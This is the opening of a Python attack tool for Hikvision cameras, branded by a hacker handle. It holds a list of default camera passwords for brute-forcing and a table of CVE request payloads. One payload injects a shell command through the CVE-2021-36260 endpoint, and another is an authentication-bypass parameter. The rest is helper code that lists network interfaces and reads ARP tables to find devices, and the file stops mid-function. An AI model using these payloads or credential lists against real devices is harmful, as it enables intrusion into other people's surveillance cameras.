#!/usr/bin/env python3

import argparse
import asyncio
import base64
import hashlib
import ipaddress
import json
import logging
import os
import random
import socket
import sqlite3
import subprocess
import sys
import threading
import time
import re
import signal
import warnings
import struct
import binascii
from collections import defaultdict, deque, Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from typing import Dict, List, Set, Tuple, Optional, Any, Union, Generator
from urllib.parse import urlparse, urljoin, quote, parse_qs
import xml.etree.ElementTree as ET
import queue
from contextlib import contextmanager
from enum import Enum, auto
from functools import lru_cache, wraps
from pathlib import Path
import hashlib
import secrets
import string
import zlib
import pickle
import tempfile
import shutil
import platform
import netifaces
import psutil

try:
    import requests
    from requests.adapters import HTTPAdapter
    from requests.packages.urllib3.util.retry import Retry
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from colorama import init, Fore, Style, Back, just_fix_windows_console
    import yaml
    from tqdm import tqdm
    from packaging import version
    import rich
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.layout import Layout
    from rich.live import Live
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
    from rich.prompt import Confirm, Prompt
    from rich.syntax import Syntax
    from rich.markdown import Markdown
    from rich import box
    from rich.align import Align
    from rich.columns import Columns
    from rich.tree import Tree
    from rich.status import Status
except ImportError as e:
    print(f"Missing required module: {e}")
    print("Install with: pip install requests lxml cryptography colorama pyyaml tqdm packaging rich netifaces psutil")
    sys.exit(1)

warnings.filterwarnings('ignore', category=InsecureRequestWarning)
warnings.filterwarnings('ignore', category=DeprecationWarning)

just_fix_windows_console()
init(autoreset=True)
console = Console()

__author__ = "SYLHETYHACKVENGER (THE-ERROR808)"
__description__ = "Advanced Hikvision Security Assessment Tool - Professional Edition"

BANNER = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣄⠴⠔⠂⠀⠀⠀⠀⠀⠐⠂⠦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⢶⠻⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢳⣗⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣼⣛⠮⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠾⣵⢧⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣞⣟⣶⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢫⢿⣝⡧⣄⠀⠀⠀⠀
⠀⠀⠀⣰⣻⡼⣾⣹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⣞⣽⣳⢆⠀⠀⠀
⠀⠀⣸⢷⣫⢷⢯⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⣼⣫⢿⣅⠀⠀
⠀⢸⣯⢯⡽⣞⣯⡇⠀⠀⠀⠀⠀⢀⣀⣠⣤⢦⣴⢶⣯⣛⣻⣞⣄⠀⠀⠀⠀⠀⠀⢸⡿⣵⢯⣟⡾⣆⠀
⢀⡿⣞⣯⣽⣛⡶⣇⠀⠀⠀⠀⠀⠀⠈⢉⣾⢿⣽⣻⣞⣷⡻⠊⠛⠂⠀⠀⠀⠀⠀⣸⢿⣽⣻⣞⣿⣽⠀
⢸⣿⡽⣞⣷⣯⢿⣽⡀⠀⠀⠀⠀⠀⢠⠿⢯⡿⣞⣷⣻⡼⡇⠀⠀⠀⠀⠀⠀⠀⢀⣿⣻⣞⣷⢿⡾⣽⡇
⢸⣷⢿⣯⣿⣾⣻⣞⡷⡄⠀⠀⠀⠀⠀⣠⣾⢿⣽⣳⣏⣷⣻⣇⠀⠀⠀⠀⠀⣀⣿⢯⣷⢿⣿⣯⣟⣯⡇
⢸⣿⣻⢻⣽⡾⣷⢯⡿⣷⣦⡀⠀⠀⣸⡿⣽⣻⡾⣗⣯⢾⡵⣯⢧⠀⠀⢀⣴⣻⣽⢿⣾⣻⣾⡟⣯⣟⡇
⠘⣿⠇⣾⢯⣿⣽⣻⣽⣷⣻⣟⣶⣴⣿⣻⣽⢷⣟⡿⣞⣯⢿⣽⣻⣤⢾⣻⣾⡽⣯⡿⣞⣷⣯⡇⠸⣿⠃
⠀⠻⠀⣿⣿⣳⣯⣟⣾⡷⣟⣾⣽⡏⢷⡿⣽⣻⡾⣿⡽⣾⣟⣾⡯⢻⣿⡽⣞⣿⣷⣿⣻⢷⣯⡧⠀⠟⠀
⠀⠀⠀⢹⣷⣯⣷⡟⣿⣟⣯⢿⣾⠁⠘⣿⣯⣷⢿⣳⡿⣷⢯⡿⠁⢸⣷⢿⣻⢷⡏⢷⣿⣻⣷⡇⠀⠀⠀
⠀⠀⠀⠘⣿⣾⣿⠁⣿⣻⡾⣿⣽⠀⠀⢹⣷⣯⡿⣯⢿⣽⢿⡇⠀⠘⣯⡿⣯⣿⣻⠈⣿⣟⡿⠁⠀⠀⠀
⠀⠀⠀⠀⠈⢿⡯⠀⢹⣿⣽⣷⣿⡀⠀⠈⣿⣷⣿⣟⣯⡿⡿⠀⠀⢘⣿⣽⣷⣿⡇⠀⣽⡿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠓⠀⠀⠻⣿⣿⣾⡇⠀⠀⢸⣿⣿⣯⣿⢿⡇⠀⠀⢸⣿⣿⣾⠏⠀⠀⠛⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⠀⠀⠀⣿⣿⣿⣿⡿⠀⠀⠀⣿⣿⡷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠆⠀⠀⠸⣿⣿⣿⡃⠀⠀⠰⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""

class Constants:
    DEFAULT_TIMEOUT = 10
    MAX_THREADS = 100
    SCAN_TIMEOUT = 30
    PACKET_TIMEOUT = 5
    MAX_RETRIES = 3
    RATE_LIMIT = 20
    
    DB_PATH = "hikraven.db"
    LOG_PATH = "hikraven.log"
    OUTPUT_DIR = "reports"
    CONFIG_PATH = "config.yaml"
    KEY_FILE = ".hikraven_key"
    CACHE_DIR = ".cache"
    PLUGIN_DIR = "plugins"
    
    COMMON_PORTS = [80, 443, 554, 8000, 37020, 8443, 8080, 9090, 7001, 7002, 8554, 10554, 37777, 37778]
    HIKVISION_PORTS = [80, 443, 554, 8000, 37020, 8443, 37777, 37778]
    RTSP_PORTS = [554, 8554, 10554, 8554, 37777]
    HTTP_PORTS = [80, 8080, 8000, 8443, 37777]
    
    HIKVISION_OUIS = {
        'c4:2f:90': 'Hikvision', 'c0:56:e3': 'Hikvision', 'bc:ad:28': 'Hikvision',
        'b4:a3:82': 'Hikvision', 'a4:14:37': 'Hikvision', '54:c4:15': 'Hikvision',
        '4c:bd:8f': 'Hikvision', '44:19:b6': 'Hikvision', '28:57:be': 'Hikvision',
        '18:68:cb': 'Hikvision', 'd8:5e:d3': 'Hikvision', '70:3a:cb': 'Hikvision',
        '6c:9c:ed': 'Hikvision', '00:17:7c': 'Hikvision', '00:19:c4': 'Hikvision',
        '00:1a:12': 'Hikvision', '00:1c:9a': 'Hikvision', '00:1d:0e': 'Hikvision',
        '00:1f:33': 'Hikvision', '00:21:4c': 'Hikvision', '00:24:6a': 'Hikvision',
        '00:26:7d': 'Hikvision', '88:8a:5a': 'Hikvision', '60:87:9f': 'Hikvision',
        '58:97:17': 'Hikvision', '44:8a:5b': 'Hikvision', '34:12:98': 'Hikvision',
        '28:29:aa': 'Hikvision', '1c:cc:6e': 'Hikvision', '14:a3:be': 'Hikvision',
        '0c:cd:3b': 'Hikvision', 'd0:9e:9b': 'Hikvision', 'ac:3e:3b': 'Hikvision',
        '94:83:2b': 'Hikvision', '84:2b:2b': 'Hikvision', '74:7e:27': 'Hikvision',
        '6c:5a:b0': 'Hikvision', '5c:2c:39': 'Hikvision', '4c:0d:9e': 'Hikvision'
    }
    
    DEFAULT_CREDS = [
        ("admin", "12345"), ("admin", "123456"), ("admin", "hikvision"),
        ("admin", "admin12345"), ("admin", "password"), ("admin", "123456789"),
        ("admin", "12345678"), ("admin", "admin"), ("admin", "hik12345"),
        ("admin", "Hik12345"), ("admin", "hik12345!"), ("admin", "12345abc"),
        ("admin", "abc12345"), ("admin", "1234567890"), ("admin", "hikvision123"),
        ("admin", "hikvision12345"), ("admin", "1234"), ("admin", "4321"),
        ("admin", "000000"), ("admin", "111111"), ("admin", "11111111"),
        ("admin", "888888"), ("admin", "666666"), ("admin", "66666666"),
        ("admin", "password123"), ("admin", "P@ssw0rd"), ("admin", "Admin123"),
        ("admin", "admin123"), ("admin", "Admin@123"), ("admin", "123456a"),
        ("admin", "hikvision@123"), ("admin", "hikvision123!"), ("admin", "123456789a"),
        ("admin", "hik@123"), ("admin", "hik@12345"), ("admin", "hikvision2020"),
        ("admin", "hikvision2021"), ("admin", "hikvision2022"), ("admin", "hikvision2023"),
        ("root", "12345"), ("root", "password"), ("root", "admin"),
        ("user", "12345"), ("user", "password"), ("guest", "guest"),
        ("operator", "12345"), ("operator", "operator"), ("viewer", "viewer")
    ]
    
    CVE_SIGNATURES = {
        "CVE-2021-36260": {
            "path": "/SDK/webLanguage",
            "method": "POST",
            "payload": '<?xml version="1.0" encoding="UTF-8"?><language>en$(id)</language>',
            "severity": "CRITICAL",
            "cvss": 9.8,
            "description": "Command injection vulnerability in web interface",
            "detection": "id=uid=",
            "exploit_available": True,
            "category": "RCE"
        },
        "CVE-2017-7923": {
            "path": "/Security/users",
            "method": "GET",
            "params": {"auth": "YWRtaW46MTEK"},
            "severity": "HIGH",
            "cvss": 7.5,
            "description": "Authentication bypass vulnerability",
            "detection": "statusCode=1",
            "exploit_available": True,
            "category": "Auth Bypass"
        },
        "CVE-2019-11376": {
            "path": "/SDK/System/deviceInfo",
            "method": "GET",
            "severity": "HIGH",
            "cvss": 7.8,
            "description": "Information disclosure vulnerability",
            "detection": "<deviceInfo",
            "exploit_available": False,
            "category": "Info Disclosure"
        },
        "CVE-2017-7925": {
            "path": "/Security/authorization",
            "method": "GET",
            "severity": "HIGH",
            "cvss": 7.5,
            "description": "Authentication bypass via improper authorization",
            "detection": "statusCode=1",
            "exploit_available": False,
            "category": "Auth Bypass"
        },
        "CVE-2018-10321": {
            "path": "/SDK/System/status",
            "method": "GET",
            "severity": "MEDIUM",
            "cvss": 6.5,
            "description": "Information disclosure vulnerability",
            "detection": "<SystemStatus",
            "exploit_available": False,
            "category": "Info Disclosure"
        },
        "CVE-2020-36208": {
            "path": "/SDK/System/time",
            "method": "POST",
            "payload": '<?xml version="1.0" encoding="UTF-8"?><Time><time>test</time></Time>',
            "severity": "MEDIUM",
            "cvss": 6.5,
            "description": "Command injection vulnerability",
            "detection": "<Time",
            "exploit_available": False,
            "category": "RCE"
        },
        "CVE-2022-28174": {
            "path": "/SDK/System/log",
            "method": "GET",
            "severity": "MEDIUM",
            "cvss": 6.1,
            "description": "Information disclosure vulnerability",
            "detection": "<log",
            "exploit_available": False,
            "category": "Info Disclosure"
        },
        "CVE-2021-36261": {
            "path": "/SDK/System/deviceInfo",
            "method": "GET",
            "severity": "HIGH",
            "cvss": 7.8,
            "description": "Information disclosure vulnerability",
            "detection": "<DeviceInfo",
            "exploit_available": False,
            "category": "Info Disclosure"
        },
        "CVE-2023-28807": {
            "path": "/SDK/System/security",
            "method": "GET",
            "severity": "HIGH",
            "cvss": 7.5,
            "description": "Security configuration disclosure",
            "detection": "<Security",
            "exploit_available": False,
            "category": "Info Disclosure"
        },
        "CVE-2014-4880": {
            "path": "/SDK/System/deviceInfo",
            "method": "GET",
            "severity": "HIGH",
            "cvss": 7.5,
            "description": "Backdoor account vulnerability",
            "detection": "admin12345",
            "exploit_available": False,
            "category": "Backdoor"
        },
        "CVE-2017-2824": {
            "path": "/SDK/System/deviceInfo",
            "method": "GET",
            "severity": "CRITICAL",
            "cvss": 9.8,
            "description": "Remote code execution vulnerability",
            "detection": "RCE",
            "exploit_available": True,
            "category": "RCE"
        },
        "CVE-2022-28179": {
            "path": "/SDK/System/deviceInfo",
            "method": "GET",
            "severity": "HIGH",
            "cvss": 7.5,
            "description": "Buffer overflow vulnerability",
            "detection": "BOF",
            "exploit_available": False,
            "category": "Memory Corruption"
        }
    }
    
    SEVERITY_ORDER = ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]
    
    THREAT_CATEGORIES = {
        "RCE": "Remote Code Execution",
        "Auth Bypass": "Authentication Bypass",
        "Info Disclosure": "Information Disclosure",
        "Backdoor": "Backdoor Access",
        "Memory Corruption": "Memory Corruption",
        "Config": "Misconfiguration",
        "Default Creds": "Default Credentials"
    }

class HikRavenError(Exception):
    pass

class DiscoveryError(HikRavenError):
    pass

class VulnerabilityError(HikRavenError):
    pass

class ExploitationError(HikRavenError):
    pass

class DatabaseError(HikRavenError):
    pass

class PluginError(HikRavenError):
    pass

class InterfaceError(HikRavenError):
    pass

class SudoManager:
    def __init__(self, logger=None):
        self.logger = logger
        self.has_sudo = self._check_sudo()
        self.elevated = False
        
    def _check_sudo(self) -> bool:
        try:
            if os.name == 'nt':
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.geteuid() == 0
        except:
            return False
    
    def elevate(self) -> bool:
        if self.has_sudo:
            self.elevated = True
            if self.logger:
                self.logger.info("Running with elevated privileges")
            return True
        
        if self.logger:
            self.logger.warning("No elevated privileges detected")
            self.logger.warning("Some features may be limited")
        return False
    
    def run_with_sudo(self, cmd: List[str]) -> Tuple[int, str, str]:
        if self.has_sudo:
            try:
                process = subprocess.Popen(
                    ['sudo'] + cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                stdout, stderr = process.communicate(timeout=30)
                return process.returncode, stdout, stderr
            except subprocess.TimeoutExpired:
                process.kill()
                return -1, "", "Timeout"
            except Exception as e:
                return -1, "", str(e)
        else:
            try:
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                stdout, stderr = process.communicate(timeout=30)
                return process.returncode, stdout, stderr
            except subprocess.TimeoutExpired:
                process.kill()
                return -1, "", "Timeout"
            except Exception as e:
                return -1, "", str(e)

class InterfaceManager:
    def __init__(self, logger=None, sudo_manager=None):
        self.logger = logger
        self.sudo_manager = sudo_manager or SudoManager(logger)
        self.interfaces = {}
        self._scan_interfaces()
    
    def _scan_interfaces(self):
        try:
            if platform.system() == 'Android':
                self._scan_android_interfaces()
            else:
                self._scan_standard_interfaces()
        except Exception as e:
            if self.logger:
                self.logger.debug(f"Interface scan error: {e}")
            self._fallback_interface_scan()
    
    def _scan_android_interfaces(self):
        try:
            result = subprocess.run(['ip', 'addr', 'show'], capture_output=True, text=True, timeout=5)
            current_iface = None
            for line in result.stdout.split('\n'):
                if ': ' in line and 'LOOPBACK' not in line:
                    parts = line.strip().split(': ')
                    if len(parts) >= 2:
                        current_iface = parts[1].split('@')[0].strip()
                        if current_iface not in self.interfaces:
                            self.interfaces[current_iface] = {
                                'name': current_iface,
                                'mac': None,
                                'ipv4': [],
                                'ipv6': [],
                                'is_up': 'UP' in line,
                                'is_loopback': False,
                                'is_virtual': False,
                                'speed': None,
                                'mtu': None,
                                'type': 'wireless' if 'wlan' in current_iface else 'ethernet'
                            }
                elif 'inet ' in line and current_iface:
                    parts = line.strip().split()
                    if len(parts) >= 2:
                        ip = parts[1].split('/')[0]
                        if ip and not ip.startswith('127.'):
                            if current_iface in self.interfaces:
                                self.interfaces[current_iface]['ipv4'].append({
                                    'address': ip,
                                    'netmask': None,
                                    'broadcast': None
                                })
            
            for iface_name in self.interfaces:
                try:
                    with open(f'/sys/class/net/{iface_name}/address', 'r') as f:
                        mac = f.read().strip()
                        self.interfaces[iface_name]['mac'] = mac
                except:
                    pass
                
                try:
                    with open(f'/sys/class/net/{iface_name}/mtu', 'r') as f:
                        mtu = f.read().strip()
                        self.interfaces[iface_name]['mtu'] = int(mtu) if mtu.isdigit() else None
                except:
                    pass
            
            if self.logger:
                self.logger.debug(f"Found {len(self.interfaces)} Android interfaces")
        except Exception as e:
            if self.logger:
                self.logger.debug(f"Android interface scan error: {e}")
            self._fallback_interface_scan()
    
    def _scan_standard_interfaces(self):
        for iface_name in netifaces.interfaces():
            iface_info = netifaces.ifaddresses(iface_name)
            
            mac = None
            if netifaces.AF_LINK in iface_info:
                mac = iface_info[netifaces.AF_LINK][0].get('addr')
            
            ipv4 = []
            if netifaces.AF_INET in iface_info:
                for addr in iface_info[netifaces.AF_INET]:
                    ipv4.append({
                        'address': addr.get('addr'),
                        'netmask': addr.get('netmask'),
                        'broadcast': addr.get('broadcast')
                    })
            
            ipv6 = []
            if netifaces.AF_INET6 in iface_info:
                for addr in iface_info[netifaces.AF_INET6]:
                    ipv6.append({
                        'address': addr.get('addr'),
                        'netmask': addr.get('netmask')
                    })
            
            is_up = self._is_interface_up(iface_name)
            is_loopback = iface_name == 'lo' or iface_name.startswith('lo')
            is_virtual = self._is_virtual_interface(iface_name)
            speed = self._get_interface_speed(iface_name)
            mtu = self._get_interface_mtu(iface_name)
            
            self.interfaces[iface_name] = {
                'name': iface_name,
                'mac': mac,
                'ipv4': ipv4,
                'ipv6': ipv6,
                'is_up': is_up,
                'is_loopback': is_loopback,
                'is_virtual': is_virtual,
                'speed': speed,
                'mtu': mtu,
                'type': self._get_interface_type(iface_name, mac)
            }
        
        if self.logger:
            self.logger.debug(f"Found {len(self.interfaces)} network interfaces")
    
    def _is_interface_up(self, iface_name: str) -> bool:
        try:
            for iface, stats in psutil.net_if_stats().items():
                if iface == iface_name:
                    return stats.isup
        except:
            pass
        
        try:
            if platform.system() == 'Windows':
                result = subprocess.run(
                    ['netsh', 'interface', 'show', 'interface', iface_name],
                    capture_output=True,
                    text=True,
                    timeout=2
                )
                return 'Connected' in result.stdout or 'Enabled' in result.stdout
            else:
                result = subprocess.run(
                    ['ip', 'link', 'show', iface_name],
                    capture_output=True,
                    text=True,
                    timeout=2
                )
                return 'UP' in result.stdout
        except:
            return False
    
    def _is_virtual_interface(self, iface_name: str) -> bool:
        virtual_patterns = [
            'docker', 'veth', 'br-', 'vlan', 'tun', 'tap', 
            'vmnet', 'vmware', 'virtual', 'vbox', 'wsl', 'bond'
        ]
        return any(pattern in iface_name.lower() for pattern in virtual_patterns)
    
    def _get_interface_speed(self, iface_name: str) -> Optional[int]:
        try:
            if iface_name in psutil.net_if_stats():
                return psutil.net_if_stats()[iface_name].speed
        except:
            pass
        return None
    
    def _get_interface_mtu(self, iface_name: str) -> Optional[int]:
        try:
            if iface_name in psutil.net_if_stats():
                return psutil.net_if_stats()[iface_name].mtu
        except:
            pass
        return None
    
    def _get_interface_type(self, iface_name: str, mac: str = None) -> str:
        iface_type = 'unknown'
        
        name_lower = iface_name.lower()
        if 'eth' in name_lower or 'enp' in name_lower or 'ens' in name_lower:
            iface_type = 'ethernet'
        elif 'wlan' in name_lower or 'wlp' in name_lower or 'wi-fi' in name_lower:
            iface_type = 'wireless'
        elif 'lo' in name_lower:
            iface_type = 'loopback'
        elif 'docker' in name_lower:
            iface_type = 'docker'
        elif 'veth' in name_lower:
            iface_type = 'virtual_ethernet'
        elif 'br-' in name_lower:
            iface_type = 'bridge'
        elif 'vlan' in name_lower:
            iface_type = 'vlan'
        elif 'tun' in name_lower or 'tap' in name_lower:
            iface_type = 'tunnel'
        elif 'usb' in name_lower:
            iface_type = 'usb'
        
        if mac and iface_type == 'unknown':
            mac_prefix = mac.lower()[:8]
            if mac_prefix.startswith('00:05:69') or mac_prefix.startswith('00:0c:29'):
                iface_type = 'vmware'
            elif mac_prefix.startswith('00:15:5d') or mac_prefix.startswith('00:50:56'):
                iface_type = 'hyperv'
            elif mac_prefix.startswith('08:00:27'):
                iface_type = 'virtualbox'
            elif mac_prefix.startswith('00:1c:42') or mac_prefix.startswith('00:0c:47'):
                iface_type = 'xen'
        
        return iface_type
    
    def _fallback_interface_scan(self):
        try:
            import socket
            import fcntl
            import struct
            
            if platform.system() != 'Windows' and platform.system() != 'Android':
                SIOCGIFCONF = 0x8912
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                buf = 4096
                while True:
                    try:
                        conf = fcntl.ioctl(sock.fileno(), SIOCGIFCONF, struct.pack('iL', buf, 0))
                        break
                    except:
                        buf += 4096
                
                for i in range(0, len(conf), 40):
                    iface = conf[i:i+16].split(b'\x00', 1)[0].decode()
                    ip = socket.inet_ntoa(conf[i+20:i+24])
                    if iface not in self.interfaces:
                        self.interfaces[iface] = {
                            'name': iface,
                            'mac': None,
                            'ipv4': [{'address': ip, 'netmask': None, 'broadcast': None}],
                            'ipv6': [],
                            'is_up': True,
                            'is_loopback': iface == 'lo',
                            'is_virtual': False,
                            'speed': None,
                            'mtu': None,
                            'type': 'unknown'
                        }
                sock.close()
            else:
                self._scan_android_interfaces()
        except:
            try:
                hostname = socket.gethostname()
                ip = socket.gethostbyname(hostname)
                self.interfaces['default'] = {
                    'name': 'default',
                    'mac': None,
                    'ipv4': [{'address': ip, 'netmask': None, 'broadcast': None}],
                    'ipv6': [],
                    'is_up': True,
                    'is_loopback': False,
                    'is_virtual': False,
                    'speed': None,
                    'mtu': None,
                    'type': 'unknown'
                }
            except:
                pass
    
    def get_interface(self, name: str) -> Optional[Dict]:
        return self.interfaces.get(name)
    
    def get_interface_by_ip(self, ip: str) -> Optional[str]:
        for iface_name, iface_info in self.interfaces.items():
            for addr in iface_info['ipv4']:
                if addr['address'] == ip:
                    return iface_name
        return None
    
    def get_active_interfaces(self) -> List[Dict]:
        return [info for info in self.interfaces.values() if info['is_up'] and not info['is_loopback']]
    
    def get_physical_interfaces(self) -> List[Dict]:
        return [info for info in self.interfaces.values() 
                if info['is_up'] and not info['is_loopback'] and not info['is_virtual']]
    
    def get_interface_names(self) -> List[str]:
        return list(self.interfaces.keys())
    
    def get_primary_ip(self) -> Tuple[str, str]:
        try:
            gateway_iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
            if gateway_iface in self.interfaces:
                for addr in self.interfaces[gateway_iface]['ipv4']:
                    if addr['address']:
                        return gateway_iface, addr['address']
        except:
            pass
        
        for iface_name, iface_info in self.interfaces.items():
            if iface_info['is_up'] and not iface_info['is_loopback'] and not iface_info['is_virtual']:
                for addr in iface_info['ipv4']:
                    if addr['address'] and not addr['address'].startswith('127.'):
                        return iface_name, addr['address']
        
        if platform.system() == 'Android':
            for iface_name, iface_info in self.interfaces.items():
                if iface_info.get('ipv4') and iface_info['ipv4'][0].get('address'):
                    return iface_name, iface_info['ipv4'][0]['address']
        
        return 'default', '127.0.0.1'
    
    def get_ip_from_interface(self, iface_name: str) -> Optional[str]:
        iface = self.get_interface(iface_name)
        if iface and iface['ipv4']:
            for addr in iface['ipv4']:
                if addr['address'] and not addr['address'].startswith('127.'):
                    return addr['address']
        return None
    
    def get_mac_from_interface(self, iface_name: str) -> Optional[str]:
        iface = self.get_interface(iface_name)
        return iface['mac'] if iface else None
    
    def get_interface_stats(self, iface_name: str) -> Dict:
        stats = {}
        try:
            if iface_name in psutil.net_if_stats():
                net_stats = psutil.net_if_stats()[iface_name]
                stats.update({
                    'isup': net_stats.isup,
                    'duplex': str(net_stats.duplex),
                    'speed': net_stats.speed,
                    'mtu': net_stats.mtu,
                    'flags': str(net_stats.flags)
                })
            
            io_stats = psutil.net_io_counters(pernic=True)
            if iface_name in io_stats:
                stats.update({
                    'bytes_sent': io_stats[iface_name].bytes_sent,
                    'bytes_recv': io_stats[iface_name].bytes_recv,
                    'packets_sent': io_stats[iface_name].packets_sent,
                    'packets_recv': io_stats[iface_name].packets_recv,
                    'errin': io_stats[iface_name].errin,
                    'errout': io_stats[iface_name].errout,
                    'dropin': io_stats[iface_name].dropin,
                    'dropout': io_stats[iface_name].dropout
                })
        except:
            pass
        return stats
    
    def get_interface_peers(self, iface_name: str, timeout: int = 2) -> List[Dict]:
        devices = []
        try:
            arp_cache = {}
            try:
                if platform.system() == 'Windows':
                    result = subprocess.run(['arp', '-a'], capture_output=True, text=True, timeout=timeout)
                    for line in result.stdout.split('\n'):
                        parts = line.strip().split()
                        if len(parts) >= 3 and '.' in parts[0] and ':' in parts[1]:
                            ip = parts[0]
                            mac = parts[1]
                            status = ' '.join(parts[2:])
                            if 'dynamic' in status.lower() or 'static' in status.lower():
                                arp_cache[ip] = mac
                elif platform.system() == 'Android':
                    result = subprocess.run(['ip', 'neigh', 'show'], capture_output=True, text=True, timeout=timeout)
                    for line in result.stdout.split('\n'):
                        parts = line.strip().split()
                        if len(parts) >= 3 and '.' in parts[0] and ':' in parts[2]:
                            ip = parts[0]
                            mac = parts[2]
                            status = parts[-1] if parts[-1] in ['REACHABLE', 'STALE', 'PERMANENT'] else None
                            if status in ['REACHABLE', 'STALE', 'PERMANENT']:
                                arp_cache[ip] = mac
                else:
                    if self.sudo_manager and self.sudo_manager.has_sudo:
                        result = self.sudo_manager.run_with_sudo(['ip', 'neigh', 'show'])
                        if result[0] == 0:
                            stdout = result[1]
                        else:
                            result = subprocess.run(['ip', 'neigh', 'show'], capture_output=True, text=True, timeout=timeout)
                            stdout = result.stdout
                    else:
                        result = subprocess.run(['ip', 'neigh', 'show'], capture_output=True, text=True, timeout=timeout)
                        stdout = result.stdout
                    
                    for line in stdout.split('\n'):
                        parts = line.strip().split()
                        if len(parts) >= 3 and '.' in parts[0] and ':' in parts[2]:
                            ip = parts[0]
                            mac = parts[2]
                            status = parts[-1] if parts[-1] in ['REACHABLE', 'STALE', 'PERMANENT'] else None
                            if status in ['REACHABLE', 'STALE', 'PERMANENT']:
                                arp_cache[ip] = mac
            except:
                pass
            
            for ip, mac in arp_cache.items():
                devices.append({
                    'ip': ip,
                    'mac': mac,
                    'interface': iface_name,
                    'status': 'active'
                })
        except Exception as e:
            pass
        
        return devices
    
    def validate_interface(self, iface_name: str) -> bool:
        if iface_name not in self.interfaces:
            return False
        return self.interfaces[iface_name]['is_up']

def timing_decorator(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        start = time.time()
        result = func(*args, **kwargs)
        end = time.time()
        if hasattr(args[0], 'logger') and args[0].logger:
            args[0].logger.debug(f"{func.__name__} took {end - start:.2f}s")
        return result
    return wrapper

def safe_operation(default=None):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            try:
                return func(*args, **kwargs)
            except Exception as e:
                if args and hasattr(args[0], 'logger') and args[0].logger:
                    args[0].logger.debug(f"Error in {func.__name__}: {e}")
                return default
        return wrapper
    return decorator

def generate_device_fingerprint(device: 'HikDevice') -> str:
    components = [
        device.mac_address or '',
        device.serial_number or '',
        device.model or '',
        device.software_version or '',
        device.firmware_version or '',
    ]
    fingerprint_data = '|'.join(components)
    return hashlib.sha256(fingerprint_data.encode()).hexdigest()[:16]

def is_ip_valid(ip: str) -> bool:
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def is_mac_valid(mac: str) -> bool:
    pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
    return bool(re.match(pattern, mac))

def get_local_ip() -> str:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        try:
            if platform.system() == 'Android':
                result = subprocess.run(['ip', 'addr', 'show'], capture_output=True, text=True, timeout=2)
                for line in result.stdout.split('\n'):
                    if 'inet ' in line and 'wlan' in line:
                        parts = line.strip().split()
                        if len(parts) >= 2:
                            ip = parts[1].split('/')[0]
                            if ip and not ip.startswith('127.'):
                                return ip
            return '127.0.0.1'
        except:
            return '127.0.0.1'

def get_mac_from_ip(ip: str) -> Optional[str]:
    try:
        if platform.system() == 'Android':
            result = subprocess.run(['ip', 'neigh', 'show', ip], capture_output=True, text=True, timeout=2)
            for line in result.stdout.split('\n'):
                if ':' in line:
                    parts = line.strip().split()
                    if len(parts) >= 3:
                        return parts[2]
            return None
        else:
            result = subprocess.run(['arp', '-a', ip], capture_output=True, text=True, timeout=2)
            for line in result.stdout.split('\n'):
                if ip in line and ':' in line:
                    parts = line.strip().split()
                    for part in parts:
                        if ':' in part and len(part) == 17:
                            return part
            return None
    except:
        return None

def generate_secure_password(length: int = 16) -> str:
